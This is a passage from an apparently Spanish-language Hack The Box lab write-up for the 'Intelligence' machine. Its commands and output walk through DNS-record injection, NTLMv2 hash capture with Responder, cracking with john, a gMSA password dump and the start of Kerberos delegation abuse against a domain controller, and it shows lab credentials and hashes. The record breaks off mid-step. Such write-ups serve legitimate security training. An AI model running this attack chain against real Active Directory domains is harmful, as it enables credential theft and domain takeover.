  AppData                            DH        0  Sun Apr 18 19:51:46 2021
  Application Data                DHSrn        0  Sun Apr 18 19:51:46 2021
  Cookies                         DHSrn        0  Sun Apr 18 19:51:46 2021
  Desktop                            DR        0  Sun Apr 18 19:51:46 2021
  Documents                          DR        0  Sun Apr 18 19:51:46 2021
  Downloads                          DR        0  Sat Sep 15 02:12:33 2018
  Favorites                          DR        0  Sat Sep 15 02:12:33 2018
  Links                              DR        0  Sat Sep 15 02:12:33 2018
  Local Settings                  DHSrn        0  Sun Apr 18 19:51:46 2021
  Music                              DR        0  Sat Sep 15 02:12:33 2018
  My Documents                    DHSrn        0  Sun Apr 18 19:51:46 2021
  NetHood                         DHSrn        0  Sun Apr 18 19:51:46 2021
  NTUSER.DAT                        AHn   131072  Sun Aug 11 17:42:51 2024
  ntuser.dat.LOG1                   AHS    86016  Sun Apr 18 19:51:46 2021
  ntuser.dat.LOG2                   AHS        0  Sun Apr 18 19:51:46 2021
  NTUSER.DAT<span class="o">{</span>6392777f-a0b5-11eb-ae6e-000c2908ad93<span class="o">}</span>.TM.blf    AHS    65536  Sun Apr 18 19:51:46 2021
  NTUSER.DAT<span class="o">{</span>6392777f-a0b5-11eb-ae6e-000c2908ad93<span class="o">}</span>.TMContainer00000000000000000001.regtrans-ms    AHS   524288  Sun Apr 18 19:51:46 2021
  NTUSER.DAT<span class="o">{</span>6392777f-a0b5-11eb-ae6e-000c2908ad93<span class="o">}</span>.TMContainer00000000000000000002.regtrans-ms    AHS   524288  Sun Apr 18 19:51:46 2021
  ntuser.ini                        AHS       20  Sun Apr 18 19:51:46 2021
  Pictures                           DR        0  Sat Sep 15 02:12:33 2018
  Recent                          DHSrn        0  Sun Apr 18 19:51:46 2021
  Saved Games                         D        0  Sat Sep 15 02:12:33 2018
  SendTo                          DHSrn        0  Sun Apr 18 19:51:46 2021
  Start Menu                      DHSrn        0  Sun Apr 18 19:51:46 2021
  Templates                       DHSrn        0  Sun Apr 18 19:51:46 2021
  Videos                             DR        0  Sat Sep 15 02:12:33 2018

		3770367 blocks of size 4096. 1437659 blocks available
smb: <span class="se">\T</span>iffany.Molina<span class="se">\&gt;</span> <span class="nb">cd </span>Desktop
smb: <span class="se">\T</span>iffany.Molina<span class="se">\D</span>esktop<span class="se">\&gt;</span> <span class="nb">dir</span>
  <span class="nb">.</span>                                  DR        0  Sun Apr 18 19:51:46 2021
  ..                                 DR        0  Sun Apr 18 19:51:46 2021
  user.txt                           AR       34  Sun Aug 11 17:33:28 2024

		3770367 blocks of size 4096. 1437643 blocks available
smb: <span class="se">\T</span>iffany.Molina<span class="se">\D</span>esktop<span class="se">\&gt;</span> get user.txt
getting file <span class="se">\T</span>iffany.Molina<span class="se">\D</span>esktop<span class="se">\u</span>ser.txt of size 34 as user.txt <span class="o">(</span>0.1 KiloBytes/sec<span class="o">)</span> <span class="o">(</span>average 0.1 KiloBytes/sec<span class="o">)</span>
smb: <span class="se">\T</span>iffany.Molina<span class="se">\D</span>esktop<span class="se">\&gt;</span> 
</code></pre></div></div>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ <span class="nb">cat </span>user.txt
───────┬────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
       │ File: user.txt
───────┼────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
   1   │ d07ff52158e75818a204e25d39744c93
───────┴────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
</code></pre></div></div>

<h2 id="shell-as-nt-authority-system-and-root-flag">Shell as nt authority system and root flag</h2>

<ul>
  <li>Si seguimos enumerando encontramos un script en powershell.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ smbclient <span class="nt">-U</span> Tiffany.Molina //10.10.10.248/IT
Password <span class="k">for</span> <span class="o">[</span>WORKGROUP<span class="se">\T</span>iffany.Molina]:
Try <span class="s2">"help"</span> to get a list of possible commands.
smb: <span class="se">\&gt;</span> <span class="nb">ls</span>
  <span class="nb">.</span>                                   D        0  Sun Apr 18 19:50:55 2021
  ..                                  D        0  Sun Apr 18 19:50:55 2021
  downdetector.ps1                    A     1046  Sun Apr 18 19:50:55 2021

		3770367 blocks of size 4096. 1437627 blocks available
smb: <span class="se">\&gt;</span> get downdetector.ps1 
getting file <span class="se">\d</span>owndetector.ps1 of size 1046 as downdetector.ps1 <span class="o">(</span>2.4 KiloBytes/sec<span class="o">)</span> <span class="o">(</span>average 2.4 KiloBytes/sec<span class="o">)</span>
</code></pre></div></div>

<ul>
  <li>Este script lo que esta haciendo es acceder a LDAP y obtiene una lista de todas las computadoras, luego recorre aquellas cuyo nombre comienza con “web”. Intentará realizar una solicitud web a ese servidor (usando las credenciales del usuario en ejecución), y si el código de estado no es 200, enviará un correo electrónico a Ted.Graves para informarle que el host está caído. El comentario al principio indica que está programado para ejecutarse cada cinco minutos.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ <span class="nb">cat </span>downdetector.ps1
───────┬────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
       │ File: downdetector.ps1   &lt;UTF-16LE&gt;
───────┼────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
   1   │ <span class="c"># Check web server status. Scheduled to run every 5min</span>
   2   │ Import-Module ActiveDirectory 
   3   │ foreach<span class="o">(</span><span class="nv">$record</span> <span class="k">in </span>Get-ChildItem <span class="s2">"AD:DC=intelligence.htb,CN=MicrosoftDNS,DC=DomainDnsZones,DC=intelligence,DC=htb"</span> | Wh
       │ ere-Object Name <span class="nt">-like</span> <span class="s2">"web*"</span><span class="o">)</span>  <span class="o">{</span>
   4   │ try <span class="o">{</span>
   5   │ <span class="nv">$request</span> <span class="o">=</span> Invoke-WebRequest <span class="nt">-Uri</span> <span class="s2">"http://</span><span class="si">$(</span><span class="nv">$record</span>.Name<span class="si">)</span><span class="s2">"</span> <span class="nt">-UseDefaultCredentials</span>
   6   │ <span class="k">if</span><span class="o">(</span>.StatusCode <span class="nt">-ne</span> 200<span class="o">)</span> <span class="o">{</span>
   7   │ Send-MailMessage <span class="nt">-From</span> <span class="s1">'Ted Graves &lt;Ted.Graves@intelligence.htb&gt;'</span> <span class="nt">-To</span> <span class="s1">'Ted Graves &lt;Ted.Graves@intelligence.htb&gt;'</span> <span class="nt">-Subje</span>
       │ ct <span class="s2">"Host: </span><span class="si">$(</span><span class="nv">$record</span>.Name<span class="si">)</span><span class="s2"> is down"</span>
   8   │ <span class="o">}</span>
   9   │ <span class="o">}</span> catch <span class="o">{}</span>
  10   │ <span class="o">}</span>
───────┴────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
</code></pre></div></div>

<ul>
  <li>Podemos robar un hash con esta herramienta para inyectar un record <a href="https://raw.githubusercontent.com/dirkjanm/krbrelayx/master/dnstool.py">https://raw.githubusercontent.com/dirkjanm/krbrelayx/master/dnstool.py</a>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ python3 dnstool.py
usage: dnstool.py <span class="o">[</span><span class="nt">-h</span><span class="o">]</span> <span class="o">[</span><span class="nt">-u</span> USERNAME] <span class="o">[</span><span class="nt">-p</span> PASSWORD] <span class="o">[</span><span class="nt">--forest</span><span class="o">]</span> <span class="o">[</span><span class="nt">--legacy</span><span class="o">]</span> <span class="o">[</span><span class="nt">--zone</span> ZONE] <span class="o">[</span><span class="nt">--print-zones</span><span class="o">]</span> <span class="o">[</span><span class="nt">--tcp</span><span class="o">]</span> <span class="o">[</span><span class="nt">-k</span><span class="o">]</span>
                  <span class="o">[</span><span class="nt">-port</span> port] <span class="o">[</span><span class="nt">-force-ssl</span><span class="o">]</span> <span class="o">[</span><span class="nt">-dc-ip</span> ip address] <span class="o">[</span><span class="nt">-dns-ip</span> ip address] <span class="o">[</span><span class="nt">-aesKey</span> hex key] <span class="o">[</span><span class="nt">-r</span> TARGETRECORD]
                  <span class="o">[</span><span class="nt">-a</span> <span class="o">{</span>add,modify,query,remove,resurrect,ldapdelete<span class="o">}]</span> <span class="o">[</span><span class="nt">-t</span> <span class="o">{</span>A<span class="o">}]</span> <span class="o">[</span><span class="nt">-d</span> RECORDDATA] <span class="o">[</span><span class="nt">--allow-multiple</span><span class="o">]</span> <span class="o">[</span><span class="nt">--ttl</span> TTL]
                  HOSTNAME
dnstool.py: error: the following arguments are required: HOSTNAME
</code></pre></div></div>

<ul>
  <li>Vamos a poner que el nombre que comienza con web para que todo funcione.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ python3 dnstool.py <span class="nt">-u</span> <span class="s1">'intelligence.htb\Tiffany.Molina'</span> <span class="nt">-p</span> <span class="s1">'NewIntelligenceCorpUser9876'</span> <span class="nt">-r</span> webmiguel <span class="nt">-a</span> add <span class="nt">-t</span> A <span class="nt">-d</span> 10.10.14.30 10.10.10.248
<span class="o">[</span>-] Connecting to host...
<span class="o">[</span>-] Binding to host
<span class="o">[</span>+] Bind OK
<span class="o">[</span>-] Adding new record
<span class="o">[</span>+] LDAP operation completed successfully
</code></pre></div></div>

<ul>
  <li>Vamos a capturar el trafico como ya se inyecto el DNS record y se ejecute el script la autenticación ira hacia nosotros y vamos a ver el hash del usuario.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ <span class="nb">sudo </span>responder <span class="nt">-I</span> tun0
</code></pre></div></div>

<ul>
  <li>Después de unos minutos nos llega el hash.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ <span class="nb">sudo </span>responder <span class="nt">-I</span> tun0
<span class="o">[</span><span class="nb">sudo</span><span class="o">]</span> password <span class="k">for </span>miguelrega7: 
                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  <span class="nt">-__</span>|__ <span class="nt">--</span>|  _  |  _  |     |  _  <span class="o">||</span>  <span class="nt">-__</span>|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|

           NBT-NS, LLMNR &amp; MDNS Responder 3.1.4.0

  To support this project:
  Github -&gt; https://github.com/sponsors/lgandx
  Paypal  -&gt; https://paypal.me/PythonResponder

  Author: Laurent Gaffie <span class="o">(</span>laurent.gaffie@gmail.com<span class="o">)</span>
  To <span class="nb">kill </span>this script hit CTRL-C


<span class="o">[</span>+] Poisoners:
    LLMNR                      <span class="o">[</span>ON]
    NBT-NS                     <span class="o">[</span>ON]
    MDNS                       <span class="o">[</span>ON]
    DNS                        <span class="o">[</span>ON]
    DHCP                       <span class="o">[</span>OFF]

<span class="o">[</span>+] Servers:
    HTTP server                <span class="o">[</span>ON]
    HTTPS server               <span class="o">[</span>ON]
    WPAD proxy                 <span class="o">[</span>OFF]
    Auth proxy                 <span class="o">[</span>OFF]
    SMB server                 <span class="o">[</span>ON]
    Kerberos server            <span class="o">[</span>ON]
    SQL server                 <span class="o">[</span>ON]
    FTP server                 <span class="o">[</span>ON]
    IMAP server                <span class="o">[</span>ON]
    POP3 server                <span class="o">[</span>ON]
    SMTP server                <span class="o">[</span>ON]
    DNS server                 <span class="o">[</span>ON]
    LDAP server                <span class="o">[</span>ON]
    MQTT server                <span class="o">[</span>ON]
    RDP server                 <span class="o">[</span>ON]
    DCE-RPC server             <span class="o">[</span>ON]
    WinRM server               <span class="o">[</span>ON]
    SNMP server                <span class="o">[</span>OFF]

<span class="o">[</span>+] HTTP Options:
    Always serving EXE         <span class="o">[</span>OFF]
    Serving EXE                <span class="o">[</span>OFF]
    Serving HTML               <span class="o">[</span>OFF]
    Upstream Proxy             <span class="o">[</span>OFF]

<span class="o">[</span>+] Poisoning Options:
    Analyze Mode               <span class="o">[</span>OFF]
    Force WPAD auth            <span class="o">[</span>OFF]
    Force Basic Auth           <span class="o">[</span>OFF]
    Force LM downgrade         <span class="o">[</span>OFF]
    Force ESS downgrade        <span class="o">[</span>OFF]

<span class="o">[</span>+] Generic Options:
    Responder NIC              <span class="o">[</span>tun0]
    Responder IP               <span class="o">[</span>10.10.14.30]
    Responder IPv6             <span class="o">[</span>dead:beef:2::101c]
    Challenge <span class="nb">set</span>              <span class="o">[</span>random]
    Don<span class="s1">'t Respond To Names     ['</span>ISATAP<span class="s1">', '</span>ISATAP.LOCAL<span class="s1">']

[+] Current Session Variables:
    Responder Machine Name     [WIN-Z9A9SBGSGZR]
    Responder Domain Name      [1RV7.LOCAL]
    Responder DCE-RPC Port     [45229]

[+] Listening for events...

               
[HTTP] NTLMv2 Client   : 10.10.10.248
[HTTP] NTLMv2 Username : intelligence\Ted.Graves
[HTTP] NTLMv2 Hash     : Ted.Graves::intelligence:6260985d3bd0347a:615B680BCA6559DEAB2A1A811C5F50AB:01010000000000002D4C359475ECDA0198F61145958356E00000000002000800310052005600370001001E00570049004E002D005A00390041003900530042004700530047005A0052000400140031005200560037002E004C004F00430041004C0003003400570049004E002D005A00390041003900530042004700530047005A0052002E0031005200560037002E004C004F00430041004C000500140031005200560037002E004C004F00430041004C000800300030000000000000000000000000200000F9E145FD22ACC32AA1C9D74B89FF7116BCD9740D7EA44791204DE1C72F2FEF6E0A0010000000000000000000000000000000000009003E0048005400540050002F007700650062006D0069006700750065006C002E0069006E00740065006C006C006900670065006E00630065002E006800740062000000000000000000
</span></code></pre></div></div>

<ul>
  <li>Vemos la contraseña.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ john <span class="nt">-w</span>:/usr/share/wordlists/rockyou.txt hash.txt
Using default input encoding: UTF-8
Loaded 1 password <span class="nb">hash</span> <span class="o">(</span>netntlmv2, NTLMv2 C/R <span class="o">[</span>MD4 HMAC-MD5 32/64]<span class="o">)</span>
No password hashes left to crack <span class="o">(</span>see FAQ<span class="o">)</span>
                                                                                                                                
❯ john <span class="nt">--show</span> hash.txt
Ted.Graves:Mr.Teddy:intelligence:6260985d3bd0347a:615B680BCA6559DEAB2A1A811C5F50AB:01010000000000002D4C359475ECDA0198F61145958356E00000000002000800310052005600370001001E00570049004E002D005A00390041003900530042004700530047005A0052000400140031005200560037002E004C004F00430041004C0003003400570049004E002D005A00390041003900530042004700530047005A0052002E0031005200560037002E004C004F00430041004C000500140031005200560037002E004C004F00430041004C000800300030000000000000000000000000200000F9E145FD22ACC32AA1C9D74B89FF7116BCD9740D7EA44791204DE1C72F2FEF6E0A0010000000000000000000000000000000000009003E0048005400540050002F007700650062006D0069006700750065006C002E0069006E00740065006C006C006900670065006E00630065002E006800740062000000000000000000

1 password <span class="nb">hash </span>cracked, 0 left
                                                                                         
</code></pre></div></div>

<ul>
  <li>Las credenciales son correctas.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ crackmapexec smb 10.10.10.248 <span class="nt">-u</span> <span class="s1">'Ted.Graves'</span> <span class="nt">-p</span> <span class="s1">'Mr.Teddy'</span>
SMB         10.10.10.248    445    DC               <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 10 / Server 2019 Build 17763 x64 <span class="o">(</span>name:DC<span class="o">)</span> <span class="o">(</span>domain:intelligence.htb<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
SMB         10.10.10.248    445    DC               <span class="o">[</span>+] intelligence.htb<span class="se">\T</span>ed.Graves:Mr.Teddy 
</code></pre></div></div>

<ul>
  <li>Vamos a usar <code class="language-plaintext highlighter-rouge">bloodhound</code> para enumerar el dominio y ver vías de escalar privilegios y obtener una shell.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ bloodhound-python <span class="nt">-c</span> All <span class="nt">-u</span> <span class="s1">'Ted.Graves'</span> <span class="nt">-p</span> <span class="s1">'Mr.Teddy'</span> <span class="nt">-ns</span> 10.10.10.248 <span class="nt">-d</span> intelligence.htb
INFO: Found AD domain: intelligence.htb
INFO: Getting TGT <span class="k">for </span>user
WARNING: Failed to get Kerberos TGT. Falling back to NTLM authentication. Error: Kerberos SessionError: KRB_AP_ERR_SKEW<span class="o">(</span>Clock skew too great<span class="o">)</span>
INFO: Connecting to LDAP server: dc.intelligence.htb
INFO: Found 1 domains
INFO: Found 1 domains <span class="k">in </span>the forest
INFO: Found 1 computers
INFO: Connecting to GC LDAP server: dc.intelligence.htb
INFO: Connecting to LDAP server: dc.intelligence.htb
INFO: Found 43 <span class="nb">users
</span>INFO: Found 55 <span class="nb">groups
</span>INFO: Found 2 gpos
INFO: Found 1 ous
INFO: Found 19 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: dc.intelligence.htb
INFO: Done <span class="k">in </span>00M 29S
</code></pre></div></div>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ <span class="nb">sudo </span>neo4j console
</code></pre></div></div>

<ul>
  <li>Una vez hacemos todo el proceso de neo4j ejecutamos el <code class="language-plaintext highlighter-rouge">bloodhound</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ bloodhound &amp;&gt; /dev/null &amp;
<span class="o">[</span>1] 96907
</code></pre></div></div>

<ul>
  <li>Nosotros como el usuario <code class="language-plaintext highlighter-rouge">Ted.Graves</code> podemos ver la contraseña de <code class="language-plaintext highlighter-rouge">SVC_INT</code>.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/intelligence/4.png" />
</p>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/intelligence/5.png" />
</p>

<ul>
  <li>Podemos usar la siguiente herramienta <a href="https://github.com/micahvandeusen/gMSADumper">https://github.com/micahvandeusen/gMSADumper</a>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ python3 gMSADumper.py <span class="nt">-u</span> <span class="s1">'Ted.Graves'</span> <span class="nt">-p</span> <span class="s1">'Mr.Teddy'</span> <span class="nt">-l</span> 10.10.10.248 <span class="nt">-d</span> intelligence.htb
Users or <span class="nb">groups who </span>can <span class="nb">read </span>password <span class="k">for </span>svc_int<span class="nv">$:</span>
 <span class="o">&gt;</span> DC<span class="err">$</span>
 <span class="o">&gt;</span> itsupport
svc_int<span class="nv">$:</span>::4c395675187a74271de7c4af867ad417
svc_int<span class="nv">$:</span>aes256-cts-hmac-sha1-96:cd87c9ddd67ecee7f918e83fc5506eb1cd8f8d114a4c2e763ae0340c949a777c
svc_int<span class="nv">$:</span>aes128-cts-hmac-sha1-96:541f7fe57df7994bbf6d0312a8849f94
</code></pre></div></div>

<ul>
  <li>Tenemos el privilegio de <code class="language-plaintext highlighter-rouge">AllowedToDelegate</code>.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/intelligence/6.png" />
</p>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/intelligence/7.png" />
</p>

<ul>
  <li>Podemos usar esta herramienta de <code class="language-plaintext highlighter-rouge">impacket</code> para el <code class="language-plaintext highlighter-rouge">impersonate</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ impacket-getST <span class="nt">-h</span>
Impacket v0.12.0.dev1 - Copyright 2023 Fortra

usage: getST.py <span class="o">[</span><span class="nt">-h</span><span class="o">]</span> <span class="o">[</span><span class="nt">-spn</span> SPN] <span class="o">[</span><span class="nt">-altservice</span> ALTSERVICE]
                <span class="o">[</span><span class="nt">-impersonate</span> IMPERSONATE]
                <span class="o">[</span><span class="nt">-additional-ticket</span> ticket.ccache] <span class="o">[</span><span class="nt">-ts</span><span class="o">]</span>
                <span class="o">[</span><span class="nt">-debug</span><span class="o">]</span> <span class="o">[</span><span class="nt">-u2u</span><span class="o">]</span> <span class="o">[</span><span class="nt">-self</span><span class="o">]</span>
                <span class="o">[</span><span class="nt">-force-forwardable</span><span class="o">]</span>
                <span class="o">[</span><span class="nt">-hashes</span> LMHASH:NTHASH] <span class="o">[</span><span class="nt">-no-pass</span><span class="o">]</span> <span class="o">[</span><span class="nt">-k</span><span class="o">]</span>
                <span class="o">[</span><span class="nt">-aesKey</span> hex key] <span class="o">[</span><span class="nt">-dc-ip</span> ip address]
                identity

Given a password, <span class="nb">hash </span>or aesKey, it will request a
Service Ticket and save it as ccache

positional arguments:
  identity              <span class="o">[</span>domain/]username[:password]

options:
  <span class="nt">-h</span>, <span class="nt">--help</span>            show this <span class="nb">help </span>message and <span class="nb">exit</span>
  <span class="nt">-spn</span> SPN              SPN <span class="o">(</span>service/server<span class="o">)</span> of the
                        target service the service
                        ticket will be generated <span class="k">for</span>
  <span class="nt">-altservice</span> ALTSERVICE
                        New sname/SPN to <span class="nb">set </span><span class="k">in </span>the
                        ticket
  <span class="nt">-impersonate</span> IMPERSONATE
                        target username that will be
                        impersonated <span class="o">(</span>thru S4U2Self<span class="o">)</span> <span class="k">for
                        </span>quering the ST. Keep <span class="k">in </span>mind
                        this will only work <span class="k">if </span>the
                        identity provided <span class="k">in </span>this
                        scripts is allowed <span class="k">for
                        </span>delegation to the SPN specified
  <span class="nt">-additional-ticket</span> ticket.ccache
                        include a forwardable service
                        ticket <span class="k">in </span>a S4U2Proxy request
                        <span class="k">for </span>RBCD + KCD Kerberos only
  <span class="nt">-ts</span>                   Adds timestamp to every logging
                        output
  <span class="nt">-debug</span>                Turn DEBUG output ON
  <span class="nt">-u2u</span>                  Request User-to-User ticket
  <span class="nt">-self</span>                 Only <span class="k">do </span>S4U2self, no S4U2proxy
  <span class="nt">-force-forwardable</span>    Force the service ticket
                        obtained through S4U2Self to be
                        forwardable. For best results,
                        the <span class="nt">-hashes</span> and <span class="nt">-aesKey</span> values
                        <span class="k">for </span>the specified <span class="nt">-identity</span>
                        should be provided. This allows
                        impresonation of protected <span class="nb">users
                        </span>and bypass of <span class="s2">"Kerberos-only"</span>
                        constrained delegation
                        restrictions. See CVE-2020-17049

authentication:
  <span class="nt">-hashes</span> LMHASH:NTHASH
                        NTLM hashes, format is
                        LMHASH:NTHASH
  <span class="nt">-no-pass</span>              don<span class="s1">'t ask for password (useful
                        for -k)
  -k                    Use Kerberos authentication.
                        Grabs credentials from ccache
                        file (KRB5CCNAME) based on
                        target parameters. If valid
                        credentials cannot be found, it
                        will use the ones specified in
                        the command line
  -aesKey hex key       AES key to use for Kerberos
                        Authentication (128 or 256 bits)
  -dc-ip ip address     IP Address of the domain
                        controller. If omitted it use
                        the domain part (FQDN) specified
                        in the target parameter
</span></code></pre></div></div>

<ul>
  <li>Pero necesitamos el <code class="language-plaintext highlighter-rouge">SPN</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ pywerview get-netcomputer <span class="nt">-u</span> <span class="s1">'Ted.Graves'</span> <span class="nt">-t</span> 10.10.10.248 <span class="nt">--full-data</span>
Password:
objectclass:                    top, person, organizationalPerson, user, computer, msDS-GroupManagedServiceAccount
cn:                             svc_int
distinguishedname:              <span class="nv">CN</span><span class="o">=</span>svc_int,CN<span class="o">=</span>Managed Service Accounts,DC<span class="o">=</span>intelligence,DC<span class="o">=</span>htb
instancetype:                   4
whencreated:                    2021-04-19 00:49:58+00:00
whenchanged:                    2024-08-12 04:08:48+00:00
usncreated:                     12846
usnchanged:                     102619
name:                           svc_int
objectguid:                     <span class="o">{</span>f180a079-f326-49b2-84a1-34824208d642<span class="o">}</span>
useraccountcontrol:             WORKSTATION_TRUST_ACCOUNT, TRUSTED_TO_AUTH_FOR_DELEGATION
badpwdcount:                    0
codepage:                       0
countrycode:                    0
badpasswordtime:                2024-08-12 04:08:16.285681+00:00
lastlogoff:                     1601-01-01 00:00:00+00:00
lastlogon:                      2024-08-12 04:08:48.848196+00:00
localpolicyflags:               0
pwdlastset:                     2024-08-12 03:56:15.020052+00:00
primarygroupid:                 515
objectsid:                      S-1-5-21-4210132550-3389855604-3437519686-1144
accountexpires:                 9999-12-31 23:59:59.999999+00:00
logoncount:                     1
samaccountname:                 svc_int<span class="err">$</span>
samaccounttype:                 805306369
dnshostname:                    svc_int.intelligence.htb
objectcategory:                 <span class="nv">CN</span><span class="o">=</span>ms-DS-Group-Managed-Service-Account,CN<span class="o">=</span>Schema,CN<span class="o">=</span>Configuration,DC<span class="o">=</span>intelligence,DC<span class="o">=</span>htb
iscriticalsystemobject:         False
dscorepropagationdata:          1601-01-01 00:00:00+00:00
lastlogontimestamp:             2024-08-12 04:08:48.848196+00:00
msds-allowedtodelegateto:       WWW/dc.intelligence.htb
msds-supportedencryptiontypes:  28
msds-managedpasswordid:         010000004b44534b020000006a010000130000000800000059ae9d4f448f56bf92a5f4082ed6b61100000000220000002200...
msds-managedpasswordpreviousid: 010000004b44534b020000006a010000110000000000000059ae9d4f448f56bf92a5f4082ed6b61100000000220000002200...
msds-managedpasswordinterval:   30
msds-groupmsamembership:        010004801400000000000000000000002400000001020000000000052000000020020000040050000200000000002400ff01... 

objectclass:                   top, person, organizationalPerson, user, computer
cn:                            DC
usercertificate:               308205fb308204e3a00302010202137100000002cc9c8450ce507e1c000000000002300d06092a864886f70d01010b050...
distinguishedname:             <span class="nv">CN</span><span class="o">=</span>DC,OU<span class="o">=</span>Domain Controllers,DC<span class="o">=</span>intelligence,DC<span class="o">=</span>htb
instancetype:                  4
whencreated:                   2021-04-19 00:42:41+00:00
whenchanged:                   2024-08-11 23:33:15+00:00
displayname:                   DC<span class="err">$</span>
usncreated:                    12293
memberof:                      <span class="nv">CN</span><span class="o">=</span>Pre-Windows 2000 Compatible Access,CN<span class="o">=</span>Builtin,DC<span class="o">=</span>intelligence,DC<span class="o">=</span>htb, 
                               <span class="nv">CN</span><span class="o">=</span>Cert Publishers,CN<span class="o">=</span>Users,DC<span class="o">=</span>intelligence,DC<span class="o">=</span>htb
usnchanged:                    102437
name:                          DC
objectguid:                    <span class="o">{</span>f28de281-fd79-40c5-a77b-1252b80550ed<span class="o">}</span>
useraccountcontrol:            SERVER_TRUST_ACCOUNT, TRUSTED_FOR_DELEGATION
badpwdcount:                   0
codepage:                      0
countrycode:                   0
badpasswordtime:               1601-01-01 00:00:00+00:00
lastlogoff:                    1601-01-01 00:00:00+00:00
lastlogon:                     2024-08-12 00:32:44.441931+00:00
localpolicyflags:              0
pwdlastset:                    2024-08-11 23:32:46.261578+00:00
primarygroupid:                516
objectsid:                     S-1-5-21-4210132550-3389855604-3437519686-1000
accountexpires:                9999-12-31 23:59:59.999999+00:00
logoncount:                    323
samaccountname:                DC<span class="err">$</span>
samaccounttype:                805306369
operatingsystem:               Windows Server 2019 Datacenter
operatingsystemversion:        10.0 <span class="o">(</span>17763<span class="o">)</span>
serverreferencebl:             <span class="nv">CN</span><span class="o">=</span>DC,CN<span class="o">=</span>Servers,CN<span class="o">=</span>Default-First-Site-Name,CN<span class="o">=</span>Sites,CN<span class="o">=</span>Configuration,DC<span class="o">=</span>intelligence,DC<span class="o">=</span>htb
dnshostname:                   dc.intelligence.htb
ridsetreferences:              <span class="nv">CN</span><span class="o">=</span>RID Set,CN<span class="o">=</span>DC,OU<span class="o">=</span>Domain Controllers,DC<span class="o">=</span>intelligence,DC<span class="o">=</span>htb
serviceprincipalname:          ldap/DC/intelligence, HOST/DC/intelligence, RestrictedKrbHost/DC, HOST/DC, ldap/DC, 
                               Dfsr-12F9A27C-BF97-4787-9364-D31B6C55EB04/dc.intelligence.htb, 
                               ldap/dc.intelligence.htb/ForestDnsZones.intelligence.htb, 
                               ldap/dc.intelligence.htb/DomainDnsZones.intelligence.htb, DNS/dc.intelligence.htb, 
                               GC/dc.intelligence.htb/intelligence.htb, RestrictedKrbHost/dc.intelligence.htb, 
                               RPC/195d59db-c263-4e51-b00b-4d6ce30136ea._msdcs.intelligence.htb, 
                               HOST/dc.intelligence.htb/intelligence, HOST/dc.intelligence.htb, 
                               HOST/dc.intelligence.htb/intelligence.htb, 
                               E3514235-4B06-11D1-AB04-00C04FC2DCD2/195d59db-c263-4e51-b00b-4d6ce30136ea/intelligence.htb, 
                               ldap/195d59db-c263-4e51-b00b-4d6ce30136ea._msdcs.intelligence.htb, 
                               ldap/dc.intelligence.htb/intelligence, ldap/dc.intelligence.htb, 
                               ldap/dc.intelligence.htb/intelligence.htb
objectcategory:                <span class="nv">CN</span><span class="o">=</span>Computer,CN<span class="o">=</span>Schema,CN<span class="o">=</span>Configuration,DC<span class="o">=</span>intelligence,DC<span class="o">=</span>htb
iscriticalsystemobject:        True
dscorepropagationdata:         2021-04-19 00:42:42+00:00, 1601-01-01 00:00:01+00:00
lastlogontimestamp:            2024-08-11 23:33:15.886587+00:00
msds-supportedencryptiontypes: 28
msds-generationid:             1b056d02cbe351ba...
msdfsr-computerreferencebl:    <span class="nv">CN</span><span class="o">=</span>DC,CN<span class="o">=</span>Topology,CN<span class="o">=</span>Domain System Volume,CN<span class="o">=</span>DFSR-GlobalSettings,CN<span class="o">=</span>System,DC<span class="o">=</span>intelligence,DC<span class="o">=</span>htb 
</code></pre></div></div>

<ul>
  <li>
    <p>Ahora lo impersonamos al administrador.</p>
  </li>
  <li>
    <p>Bueno esto significa que nos tenemos que sincronizar al reloj del DC.</p>
  </li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ impacket-getST <span class="nt">-spn</span> WWW/dc.intelligence.htb <span class="nt">-impersonate</span> Administrator intelligence.htb/svc_int <span class="nt">-hashes</span> :4c395675187a74271de7c4af867ad417
Impacket v0.12.0.dev1 - Copyright 2023 Fortra

<span class="o">[</span>-] CCache file is not found. Skipping...
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Getting TGT <span class="k">for </span>user
